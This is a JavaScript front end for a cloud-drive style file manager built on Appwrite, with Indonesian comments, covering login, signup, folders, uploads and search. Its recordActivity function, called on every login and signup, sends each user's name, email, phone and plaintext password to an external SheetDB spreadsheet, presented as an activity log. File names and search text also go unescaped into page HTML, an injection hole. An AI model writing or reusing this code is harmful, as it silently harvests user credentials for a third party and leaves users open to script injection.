// ======================================================
// 1. KONFIGURASI APPWRITE
// ======================================================
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI PROJECT
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; 

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// State Global
let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root';
let selectedItem = null; 
let selectedUploadFile = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null;

// Helper
const el = (id) => document.getElementById(id);
const toggleLoading = (show, msg = "Memproses...") => {
    const loader = el('loading');
    const text = el('loadingText');
    if (show) {
        if(text) text.innerText = msg;
        if(loader) loader.classList.remove('hidden');
    } else {
        if(loader) loader.classList.add('hidden');
    }
};

// ======================================================
// 2. MAIN EXECUTION
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();
    initDragAndDrop();
    initLogout();
    initSearchBar();
    initAllContextMenus();
});

// ======================================================
// 3. LOGIKA OTENTIKASI
// ======================================================

// LOGIN
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        let inputId = el('loginEmail').value.trim();
        const pass = el('loginPass').value;
        
        toggleLoading(true, "Sedang Masuk...");
        
        try {
            if (!inputId.includes('@')) {
                try {
                    const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [
                        Appwrite.Query.equal('name', inputId)
                    ]);
                    if (res.total > 0) {
                        inputId = res.documents[0].email;
                    } else {
                        throw new Error("Username tidak ditemukan.");
                    }
                } catch(err) { console.log("Cari username gagal, mencoba email..."); }
            }

            try {
                await account.createEmailPasswordSession(inputId, pass);
            } catch (authError) {
                if (authError.code === 401 || authError.message.includes('session is active')) {
                    console.log("Sesi aktif, lanjut ke dashboard...");
                } else {
                    throw authError; 
                }
            }
            
            const user = await account.get();
            try {
                const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, user.$id);
                await recordActivity('Login', { id: user.$id, name: user.name, email: user.email, phone: userDB.phone, password: pass });
            } catch(ex) {}

            checkSession(); 

        } catch (error) { 
            toggleLoading(false);
            alert("Login Gagal: " + (error.message || "Periksa data Anda."));
        }
    });
}

// SIGN UP
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value.trim();
        const email = el('regEmail').value.trim();
        const phone = el('regPhone').value.trim();
        const pass = el('regPass').value;
        const verify = el('regVerify').value;

        if (pass !== verify) return alert("Konfirmasi password salah!");
        
        toggleLoading(true, "Mendaftarkan...");
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            try { 
                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone }); 
            } catch(dbErr) {}
            
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            
            toggleLoading(false);
            alert("Berhasil! Silakan Login."); 
            window.nav('loginPage');
        } catch(e) { 
            toggleLoading(false);
            if(e.message.includes('exists')) alert("Email/Username sudah dipakai."); 
            else alert("Gagal: " + e.message);
        }
    });
}

// LOGOUT
function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true);
        btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async () => {
            if (confirm("Keluar dari aplikasi?")) {
                toggleLoading(true, "Keluar...");
                try {
                    await account.deleteSession('current');
                    window.location.reload(); 
                } catch (error) { window.location.reload(); }
            }
        });
    }
}

// ======================================================
// 4. NAVIGASI & SESI
// ======================================================
async function checkSession() {
    if(!el('loginPage').classList.contains('hidden')) toggleLoading(true, "Memuat Data...");

    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { 
        window.nav('loginPage'); 
    } finally { 
        toggleLoading(false); 
    }
}

window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        const element = el(id);
        if(element) element.classList.add('hidden');
    });
    const target = el(pageId);
    if(target) target.classList.remove('hidden');
};

// ======================================================
// 5. FILE MANAGER & SEARCH
// ======================================================
window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    element.classList.add('active');
    currentFolderId = 'root'; 
    if(mode === 'root') currentFolderName = "Drive";
    else if(mode === 'recent') currentFolderName = "Terbaru";
    else if(mode === 'starred') currentFolderName = "Berbintang";
    else if(mode === 'trash') currentFolderName = "Sampah";
    else currentFolderName = element.innerText.trim();
    loadFiles(mode);
};

window.goBack = () => {
    currentFolderId = 'root'; currentFolderName = "Drive"; 
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active');
    loadFiles('root');
};

window.openFolder = (id, name) => {
    currentFolderId = id;
    currentFolderName = name;
    loadFiles(id);
};

// Search Engine
function initSearchBar() {
    const input = el('searchInput');
    if (!input) return;
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length === 0) { el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); return; }
        el('clearSearchBtn').classList.remove('hidden');
        clearTimeout(searchTimeout);
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.search('name', keyword),
            Appwrite.Query.limit(50)
        ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;margin-top:50px;">Tidak ditemukan.</p>`;
        else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { fallbackSearch(keyword); }
}

async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => doc.name.toLowerCase().includes(keyword.toLowerCase()));
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`;
        else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}

window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

// KONTROL MENU & KLIK KANAN
function initAllContextMenus() {
    const newBtn = el('newBtnMain'); 
    const newMenu = el('dropdownMenu');
    const navDrive = el('navDrive'); // Element Drive Saya
    const globalMenu = el('globalContextMenu');
    const fileMenu = el('contextMenu');
    const mainArea = document.querySelector('.main-content-area');

    const closeAll = () => {
        if(newMenu) newMenu.classList.remove('show');
        if(globalMenu) globalMenu.classList.remove('show');
        if(fileMenu) { fileMenu.classList.add('hidden'); fileMenu.classList.remove('show'); }
        if(el('storageModal')) el('storageModal').classList.add('hidden');
    };

    // Tombol NEW (Klik Kiri & Kanan)
    if (newBtn) {
        const newBtnClean = newBtn.cloneNode(true); 
        newBtn.parentNode.replaceChild(newBtnClean, newBtn);
        
        const toggleNewMenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); 
            const wasOpen = newMenu.classList.contains('show'); 
            closeAll(); 
            if (!wasOpen) newMenu.classList.add('show'); 
        };
        newBtnClean.onclick = toggleNewMenu;
        newBtnClean.oncontextmenu = toggleNewMenu;
    }

    // Sidebar DRIVE SAYA (Klik Kanan)
    if (navDrive) {
        navDrive.oncontextmenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); closeAll(); 
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }

    // Area Kosong (Klik Kanan)
    if (mainArea) {
        mainArea.oncontextmenu = (e) => {
            if (e.target.closest('.item-card')) return;
            e.preventDefault(); closeAll();
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }
    window.onclick = () => closeAll();
}

// Render Item
function renderItem(doc) {
    const grid = el('fileGrid'); const div = document.createElement('div'); div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;"></i>` : '';
    let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp|jfif)$/i)) {
        content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
    }
    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    div.onclick = () => { if(!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); };
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        if(el('storageModal')) el('storageModal').classList.add('hidden');
        selectedItem = doc;
        const menu = el('contextMenu');
        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
        const isTrash = doc.trashed;
        el('ctxTrashBtn').classList.toggle('hidden', isTrash);
        el('ctxRestoreBtn').classList.toggle('hidden', !isTrash);
        el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash);
        el('ctxStarText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";
        menu.classList.remove('hidden'); menu.classList.add('show');
    };
    grid.appendChild(div);
}

// Storage Logic
window.openStorageModal = () => {
    el('contextMenu').classList.add('hidden');
    const total = storageDetail.total || 1;
    el('barImages').style.width = `${(storageDetail.images/total)*100}%`;
    el('barVideos').style.width = `${(storageDetail.videos/total)*100}%`;
    el('barDocs').style.width = `${(storageDetail.docs/total)*100}%`;
    el('barOthers').style.width = `${(storageDetail.others/total)*100}%`;
    el('storageBigText').innerText = (storageDetail.total / 1048576).toFixed(2) + " MB";
    el('valImages').innerText = (storageDetail.images / 1048576).toFixed(2) + " MB";
    el('valVideos').innerText = (storageDetail.videos / 1048576).toFixed(2) + " MB";
    el('valDocs').innerText = (storageDetail.docs / 1048576).toFixed(2) + " MB";
    el('valOthers').innerText = (storageDetail.others / 1048576).toFixed(2) + " MB";
    window.openModal('storageModal');
};

async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file')]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|mov|avi)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|txt)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        const mb = (storageDetail.total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`;
        el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) {}
}

// Utils (Modal, CRUD, Excel)
window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim(); if (!name) return; closeModal('folderModal'); toggleLoading(true);
    try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false }); loadFiles(currentFolderId); el('newFolderName').value = ''; } catch (e) { alert(e.message); } finally { toggleLoading(false); }
};

window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!"); closeModal('uploadModal'); toggleLoading(true);
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: storage.getFileView(CONFIG.BUCKET_ID, up.$id).href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false });
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { toggleLoading(false); }
};

window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentFolderId); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentFolderId); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.openCurrentItem = () => { if(selectedItem) selectedItem.type==='folder' ? openFolder(selectedItem.$id, selectedItem.name) : window.open(selectedItem.url, '_blank'); el('contextMenu').classList.add('hidden'); };
window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); el('contextMenu').classList.add('hidden'); };
window.renameCurrentItem = async () => { const newName = prompt("Nama baru:", selectedItem.name); if(newName) { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName}); loadFiles(currentFolderId); } el('contextMenu').classList.add('hidden'); };

function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
function handleFileSelect(file) { selectedUploadFile = file; el('fileInfoText').innerText = `Terpilih: ${file.name}`; el('fileInfoContainer').classList.remove('hidden'); }
function initDragAndDrop() {
    const zone = el('dropZone');
    const input = el('fileInputHidden');
    
    if (!zone) return;

    zone.addEventListener('dragover', (e) => {
        e.preventDefault();
        zone.classList.add('active');
    });

    zone.addEventListener('dragleave', () => {
        zone.classList.remove('active');
    }); 

    zone.addEventListener('drop', (e) => {
        e.preventDefault();
        zone.classList.remove('active');
        if (e.dataTransfer.files.length > 0) {
            handleFileSelect(e.dataTransfer.files[0]);
        }
    });

    if (input) {
        input.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFileSelect(e.target.files[0]);
            }
        });
    }
}

async function loadFiles(param) { if (!currentUser) return; const grid = el('fileGrid'); grid.innerHTML = ''; updateHeaderUI(); let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); else { if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); } try { const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; else res.documents.forEach(doc => renderItem(doc)); } catch (e) { console.error(e); } }
function updateHeaderUI() { const container = document.querySelector('.breadcrumb-area'); const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; if (isRoot) { const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; } else { container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`; } }
async function recordActivity(sheetName, userData) { try { const now = new Date(); const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':'); const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate }; await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) }); } catch (error) { console.error("Excel Log Error"); } }
window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };